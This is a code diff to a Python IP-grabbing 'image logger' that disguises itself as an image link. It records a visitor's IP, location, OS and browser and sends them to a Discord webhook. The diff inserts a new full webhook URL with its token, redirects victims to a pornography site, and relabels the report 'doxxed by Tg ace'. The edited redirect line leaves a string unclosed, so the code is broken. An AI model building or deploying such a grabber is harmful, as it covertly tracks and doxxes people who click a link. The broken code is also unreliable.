@@ -12,8 +12,8 @@ __author__ = "TG ACE"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1345848810584146050/QCi2UIcCa12w0S7Yvy0_ML8wEwrtpEILF18tWdMiPb1NLEbCQAx8aMQHmqibYyOwB3qF",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1386252504441946122/TH7cbs-ZqFpigH373p5f7XiH5e6qWdhTZwNZzcVOO12sIBxCWXXkiuF23iDgsuC3hPZy",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQNC4N4-ipY7sU7R4633akfe-VRX6BKSaWnNg&s.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://carhub.com" # Link to the webpage to redirect to 
+        "page": "https://pornhub.com # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -144,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "GRABBER BOT - IP Logged",
+            "title": " user clicked a link ! - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
@@ -166,7 +166,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **PC Info 💻:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
-> by Tg ace
+> **doxxed by Tg ace**
 **User Agent:**
 > https://tenor.com/view/good-morning-gif-27344488
 ```
